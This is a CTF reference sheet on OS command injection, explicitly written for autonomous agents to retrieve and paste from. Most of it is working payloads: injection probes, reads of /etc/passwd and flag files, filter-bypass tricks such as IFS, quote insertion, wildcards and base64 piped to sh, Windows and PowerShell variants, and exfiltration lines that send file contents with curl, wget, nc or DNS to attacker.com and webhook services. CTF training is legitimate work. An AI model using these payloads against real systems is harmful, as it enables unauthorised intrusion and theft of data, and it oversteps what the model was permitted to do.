# Command Injection (OS Command Injection) - CTF Exploitation Reference

> **Document Purpose:** Actionable command injection techniques for CTF challenges. Designed for autonomous agent retrieval with copy-paste payloads, filter bypasses, and blind exploitation methods.

---

## 1. QUICK REFERENCE: Detection Payloads

> **When to use this section:** You suspect user input is being passed to a system command.

### 1.1 Universal Detection Probes

**Tags:** `command-injection, detection, probe, testing, os-command`

**Primary Detection Payloads (Try First):**
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
; sleep 5
| sleep 5
```

**Expected Success:**
- Output of `id` command appears
- Response delayed by 5 seconds (time-based)
- Error message shows command execution context

**Quick Test Sequence:**
```
1. Normal input
2. ; whoami
3. | whoami
4. `whoami`
5. $(whoami)
6. || whoami
7. && whoami
```

**Agent Takeaway:**
- Start with `; id` or `| id`
- If no output, try time-based: `; sleep 5`
- Backticks and `$()` work inside other commands

---

### 1.2 Command Separators Reference

**Tags:** `command-injection, separators, operators, syntax`

**Linux/Unix Separators:**
```bash
;      # Execute sequentially (regardless of success)
|      # Pipe output to next command
||     # Execute if previous fails
&      # Execute in background
&&     # Execute if previous succeeds
`cmd`  # Command substitution
$(cmd) # Command substitution (preferred)
```

**Windows Separators:**
```cmd
&      Execute sequentially
|      Pipe output
||     Execute if previous fails
&&     Execute if previous succeeds
```

**Newline as Separator:**
```
%0a    URL-encoded newline
%0d    URL-encoded carriage return
%0d%0a URL-encoded CRLF
```

**Agent Takeaway:**
- Linux: `;`, `|`, `` ` ``, `$()`
- Windows: `&`, `|`
- Newlines work when semicolons are filtered

---

### 1.3 Common Vulnerable Parameters

**Tags:** `command-injection, parameters, vulnerable, endpoints`

**High-Risk Parameters:**
```
?ip=
?host=
?ping=
?cmd=
?exec=
?command=
?file=
?path=
?filename=
?backup=
?domain=
?url=
```

**Vulnerable Functionality:**
- Ping/network diagnostic tools
- File operations (backup, convert, process)
- System information pages
- PDF generators, image processors
- DNS lookups, traceroute

**Agent Takeaway:**
- Any parameter that might trigger system commands
- Look for ping, network, file processing features
- Admin panels often have more risky functionality

---

## 2. BASIC COMMAND INJECTION

> **When to use this section:** You can inject and execute arbitrary commands.

### 2.1 In-Band Command Injection (Output Visible)

**Tags:** `command-injection, in-band, basic, output`

**Appending Commands:**
```bash
127.0.0.1; id
127.0.0.1; cat /etc/passwd
127.0.0.1 | id
127.0.0.1 | cat /flag.txt
```

**Substitution Commands:**
```bash
127.0.0.1$(id)
127.0.0.1`id`
`id`
$(id)
```

**Breaking Out of Quotes:**
```bash
127.0.0.1"; id; "
127.0.0.1'; id; '
127.0.0.1`; id; `
$(id)
```

**Example Vulnerable Code:**
```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

**Exploitation:**
```
?ip=127.0.0.1; cat /flag.txt
```

**Agent Takeaway:**
- Append commands with `;` or `|`
- Use command substitution when input is within a command
- Break out of quotes if input is quoted

---

### 2.2 Finding the Flag

**Tags:** `command-injection, flag, ctf, discovery`

**Flag Hunting Commands:**
```bash
; cat /flag
; cat /flag.txt
; cat /home/*/flag*
; cat /root/flag*
; find / -name "*flag*" 2>/dev/null
; ls -la /
; env | grep -i flag
; cat /proc/1/environ
```

**Reading Files:**
```bash
; cat FILE
; head FILE
; tail FILE
; more FILE
; less FILE
; strings FILE
; xxd FILE
```

**Directory Listing:**
```bash
; ls -la
; ls -la /
; find / -type f -name "*.txt" 2>/dev/null
```

**Agent Takeaway:**
- Always try `cat /flag.txt` first
- Use `find` to search for flag files
- Check environment variables with `env`

---

## 3. BLIND COMMAND INJECTION

> **When to use this section:** Commands execute but output is not visible.

### 3.1 Time-Based Detection

**Tags:** `command-injection, blind, time-based, detection, sleep`

**Linux Time-Based:**
```bash
; sleep 5
| sleep 5
|| sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
```

**Windows Time-Based:**
```cmd
& ping -n 5 127.0.0.1
| ping -n 5 127.0.0.1
& timeout 5
```

**Conditional Time-Based:**
```bash
; if [ $(id | grep root) ]; then sleep 5; fi
; [ -f /flag.txt ] && sleep 5
; test -f /flag.txt && sleep 5
```

**Agent Takeaway:**
- Response delayed = command executed
- `sleep 5` is most reliable
- Use conditional sleep to confirm specific conditions

---

### 3.2 Out-of-Band (OOB) Data Exfiltration

**Tags:** `command-injection, blind, oob, exfiltration, dns, http`

**DNS Exfiltration:**
```bash
; nslookup $(whoami).attacker.com
; host $(whoami).attacker.com
; dig $(whoami).attacker.com
; ping -c 1 $(whoami).attacker.com
```

**HTTP Exfiltration (Using curl/wget):**
```bash
; curl http://attacker.com/?data=$(cat /flag.txt | base64)
; wget http://attacker.com/?data=$(cat /flag.txt | base64)
; curl http://attacker.com/$(whoami)
; curl -d "$(cat /flag.txt)" http://attacker.com/
```

**Using netcat:**
```bash
; cat /flag.txt | nc attacker.com 1234
; nc attacker.com 1234 < /flag.txt
```

**Webhook Services for OOB:**
```bash
; curl https://webhook.site/YOUR-ID?flag=$(cat /flag.txt | base64)
; curl -X POST -d "$(cat /flag.txt)" https://requestbin.com/YOUR-ID
```

**Agent Takeaway:**
- Use webhook.site or requestbin to receive data
- Base64 encode to avoid special character issues
- DNS exfil works even with restrictive firewalls

---

### 3.3 Blind Character-by-Character Extraction

**Tags:** `command-injection, blind, extraction, character, boolean`

**Time-Based Character Extraction:**
```bash
; if [ $(cat /flag.txt | cut -c1) = 'f' ]; then sleep 5; fi
; if [ $(cat /flag.txt | cut -c2) = 'l' ]; then sleep 5; fi
; if [ $(cat /flag.txt | cut -c3) = 'a' ]; then sleep 5; fi
```

**Using test and cut:**
```bash
; test $(head -c 1 /flag.txt) = "f" && sleep 5
; test $(head -c 2 /flag.txt | tail -c 1) = "l" && sleep 5
```

**Agent Takeaway:**
- Extract one character at a time
- Time-based: delay = character match
- Slow but works when no other option

---

## 4. FILTER BYPASS TECHNIQUES

> **When to use this section:** Basic command injection payloads are blocked.

### 4.1 Space Filter Bypass

**Tags:** `command-injection, bypass, space, filter, waf`

**Space Alternatives (Linux):**
```bash
${IFS}         # Internal Field Separator (usually space/tab/newline)
$IFS$9         # IFS + empty argument
{cat,/etc/passwd}   # Brace expansion
cat</etc/passwd     # Input redirection
cat$IFS/flag.txt
cat${IFS}/flag.txt
X=$'cat\x20/flag.txt';$X  # Hex encoded space
```

**Examples:**
```bash
;cat${IFS}/flag.txt
;cat$IFS$9/flag.txt
;{cat,/flag.txt}
;cat</flag.txt
```

**Tab Instead of Space:**
```bash
;cat	/flag.txt    # Tab character
;cat%09/flag.txt     # URL-encoded tab
```

**Agent Takeaway:**
- `${IFS}` is the most reliable space bypass
- Brace expansion `{cmd,arg}` avoids spaces entirely
- Input redirection `<` can replace arguments

---

### 4.2 Keyword Filter Bypass

**Tags:** `command-injection, bypass, keyword, blacklist, filter`

**String Concatenation:**
```bash
;c'a't /flag.txt
;c"a"t /flag.txt
;c\at /flag.txt
;ca$()t /flag.txt
;/bin/c?t /flag.txt
;/bin/ca* /flag.txt
```

**Using Variables:**
```bash
;a=c;b=at;$a$b /flag.txt
;$(echo cat) /flag.txt
;$(printf cat) /flag.txt
```

**Base64 Encoding:**
```bash
;echo Y2F0IC9mbGFnLnR4dA== | base64 -d | sh
;bash -c "$(echo Y2F0IC9mbGFnLnR4dA== | base64 -d)"
```

**Hex/Octal Encoding:**
```bash
;$(printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2e\x74\x78\x74')
;$'\x63\x61\x74' /flag.txt
;$'\143\141\164' /flag.txt
```

**Wildcards:**
```bash
;/???/??t /flag.txt      # /bin/cat
;/???/???/?at /flag.txt  # /usr/bin/cat
;cat /f*                  # matches /flag*
;cat /fla?.txt            # matches /flag.txt
```

**Agent Takeaway:**
- Quote insertion: `c'a't` bypasses `cat` filter
- Wildcards: `/???/??t` = `/bin/cat`
- Base64: encode entire command to bypass all filters

---

### 4.3 Operator Filter Bypass

**Tags:** `command-injection, bypass, operators, separator, filter`

**If Semicolon Filtered:**
```bash
| cmd          # Pipe
|| cmd         # OR
& cmd          # Background
&& cmd         # AND
%0a cmd        # Newline
`cmd`          # Substitution
$(cmd)         # Substitution
```

**URL-Encoded Operators:**
```
%3B = ;
%7C = |
%26 = &
%0A = newline
%24 = $
%60 = `
```

**Double URL Encoding:**
```
%253B = ; (decoded twice)
%257C = |
```

**Agent Takeaway:**
- Try alternative operators when one is blocked
- URL encoding often bypasses filters
- Newline (`%0a`) is frequently overlooked

---

### 4.4 Command Alternative Reference

**Tags:** `command-injection, bypass, alternatives, commands`

**Reading Files (If `cat` Blocked):**
```bash
tac /flag.txt          # cat backwards
head /flag.txt
tail /flag.txt
more /flag.txt
less /flag.txt
nl /flag.txt           # with line numbers
sort /flag.txt
uniq /flag.txt
strings /flag.txt
xxd /flag.txt          # hex dump
base64 /flag.txt
rev /flag.txt | rev
dd if=/flag.txt
sed '' /flag.txt
awk '{print}' /flag.txt
```

**Command Execution (If `bash` Blocked):**
```bash
sh -c "cmd"
dash -c "cmd"
zsh -c "cmd"
ksh -c "cmd"
python -c "import os; os.system('cmd')"
perl -e 'system("cmd")'
ruby -e '`cmd`'
```

**Network Tools:**
```bash
curl URL
wget URL
nc HOST PORT
telnet HOST PORT
```

**Agent Takeaway:**
- Many commands can read files: `tac`, `head`, `xxd`, etc.
- Many shells available: `sh`, `dash`, `zsh`
- Know alternatives for commonly filtered commands

---

### 4.5 Filter Bypass Decision Tree

**Tags:** `command-injection, bypass, decision-tree, workflow`

```
START: Basic payload blocked

IDENTIFY: What's filtered?
├── Spaces → Use ${IFS}, tabs, brace expansion
├── Semicolons → Use |, ||, &, &&, newlines
├── Keywords (cat, flag) → Quote injection, wildcards, encoding
├── Backticks → Use $()
└── All operators → Try base64 encoded command

STEP 1: Try alternative separators
├── ; blocked → try |
├── | blocked → try %0a (newline)
└── All blocked → try substitution `cmd` or $(cmd)

STEP 2: Try space bypass
├── ${IFS} most reliable
├── {cmd,arg} no spaces needed
└── < for file reading

STEP 3: Try keyword bypass
├── Quote insertion: c'a't
├── Wildcards: /???/??t
├── Variables: a=cat;$a
└── Encoding: base64, hex

STEP 4: Try alternative commands
├── cat blocked → tac, head, xxd
├── bash blocked → sh, python, perl
└── Common tool blocked → find alternative

FINAL: Base64 entire payload
└── echo BASE64 | base64 -d | sh
```

---

## 5. WINDOWS COMMAND INJECTION

> **When to use this section:** Target is a Windows system.

### 5.1 Windows Detection and Basic Payloads

**Tags:** `command-injection, windows, detection, payloads`

**Detection:**
```cmd
& whoami
| whoami
|| whoami
&& whoami
```

**Basic Commands:**
```cmd
& dir
& type C:\flag.txt
& type C:\Users\Administrator\Desktop\flag.txt
& net user
& ipconfig
& systeminfo
```

**Reading Files:**
```cmd
& type FILE
& more FILE
& find /v "" FILE
```

---

### 5.2 Windows Bypass Techniques

**Tags:** `command-injection, windows, bypass, filter`

**Variable Substitution:**
```cmd
& %COMSPEC:~0,1%%COMSPEC:~4,1%t /flag.txt
# Builds "cat" from COMSPEC path
```

**Environment Variables:**
```cmd
& set a=who& set b=ami& %a%%b%
```

**PowerShell:**
```cmd
& powershell -c "Get-Content C:\flag.txt"
& powershell -enc BASE64_COMMAND
```

**Agent Takeaway:**
- Windows uses `&` as primary separator
- PowerShell provides more capabilities
- Encoded PowerShell commands for complex payloads

---

## 6. CTF-SPECIFIC STRATEGIES

> **When to use this section:** Solving command injection challenges in CTF.

### 6.1 Command Injection Playbook

**Tags:** `command-injection, ctf, playbook, workflow`

**Step 1: Identify Injection Point**
```
Look for: ping, network tools, file operations, processing
Test: ; id, | id, `id`, $(id)
```

**Step 2: Confirm Execution**
```
If output visible: Check for command output
If no output: Use time-based (sleep 5)
```

**Step 3: Find Flag**
```bash
; cat /flag.txt
; cat /flag
; find / -name "*flag*" 2>/dev/null
; ls -la /
; env | grep FLAG
```

**Step 4: If Filtered**
```bash
; c'a't /flag.txt
; cat${IFS}/flag.txt
; /???/??t /flag.txt
; echo Y2F0IC9mbGFnLnR4dA== | base64 -d | sh
```

**Step 5: If Blind**
```bash
; curl http://attacker.com/?f=$(cat /flag.txt | base64)
; wget http://attacker.com/$(cat /flag.txt | base64)
; sleep $(cat /flag.txt | wc -c)
```

**Agent Takeaway:**
- Test injection → Find flag → Bypass filters if needed
- Use OOB exfiltration for blind injection
- Know common bypasses: `${IFS}`, quote insertion, wildcards

---

## 7. SUMMARY: Command Injection Quick Reference

**Detection:**
```
; id
| id
$(id)
`id`
```

**Space Bypass:**
```
${IFS}
{cmd,arg}
<
%09 (tab)
```

**Keyword Bypass:**
```
c'a't
c"a"t
/???/??t
base64 encoding
```

**Read Flag:**
```bash
; cat /flag.txt
; cat${IFS}/flag.txt
; /???/??t${IFS}/fla?.txt
```

**Blind Exfiltration:**
```bash
; curl http://attacker.com/?f=$(cat /flag.txt | base64)
; sleep 5
```

**Command Alternatives:**
- File read: `cat`, `tac`, `head`, `tail`, `xxd`, `base64`
- Shell: `bash`, `sh`, `dash`, `zsh`, `python`, `perl`
